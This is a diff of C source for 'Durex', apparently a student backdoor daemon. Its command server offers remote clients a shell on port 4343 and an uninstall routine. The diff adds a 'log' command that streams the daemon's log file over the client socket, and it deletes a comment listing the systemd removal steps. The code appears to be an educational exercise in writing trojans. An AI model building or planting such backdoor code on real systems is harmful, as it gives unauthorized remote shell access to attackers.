@@ -6,12 +6,13 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/20 17:11:00 by abara            ###   ########.fr       */
+/*   Updated: 2019/11/21 11:09:28 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "server.h"
 #include "Durex.h"
+
 extern char **environ;
 
 static t_bool	server_cmd_help(t_client *client, t_server *server)
@@ -20,10 +21,32 @@ static t_bool	server_cmd_help(t_client *client, t_server *server)
 							"\t'help' or '?'\t- Show this message.\n"
 							"\t'exit'\t\t- Quit Durex.\n"
 							"\t'shell'\t\t- Spawn a shell on port 4343.\n"
-							"\t'uninstall'\t- Uninstall Durex.\n";
+							"\t'uninstall'\t- Uninstall Durex.\n"
+							"\t'log'\t\t- Print durex log file.\n";
 	if (!server || !client)
 		return (false);
 	send_text(help_content, client->socket);
+	return (true);
+}
+
+static t_bool	server_cmd_log(t_client *client, t_server *server)
+{
+	int		fd;
+	int		ret;
+	char	buf[READ_BUFFER_SIZE];
+
+	if (!server || !client)
+		return (false);
+	if ((fd = open(DUREX_LOG_FILE, O_RDONLY)) < 0)
+	{
+		durex_log("Can't open log file", LOG_WARNING);
+		durex_log(strerror(errno), LOG_WARNING);
+		send_text("Can't open log file.", client->socket);
+		return (false);
+	}
+	while((ret = read(fd, buf, READ_BUFFER_SIZE)) > 0)
+		send(client->socket, buf, ret, 0);
+	close(fd);
 	return (true);
 }
 
@@ -84,13 +107,6 @@ static t_bool	server_cmd_exit(t_client *client, t_server *server)
 	return (true);
 }
 
-/*
-**	remove /bin/Durex
-**	systemctl stop durex
-**	systemctl disable durex
-**	remove /etc/systemd/system/durex.service
-**	systemctl reset-failed
-*/
 static t_bool	server_cmd_uninstall(t_client *client, t_server *server)
 {
 	if (!server || !client)
@@ -112,6 +128,7 @@ static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
  	[HELP_ALIAS] = {"?", server_cmd_help},
 	[UNINSTALL] = COMMAND(uninstall),
 	[SHELL] = COMMAND(shell),
+	[LOG] = COMMAND(log),
 	[EXIT] = COMMAND(exit),
 };
 
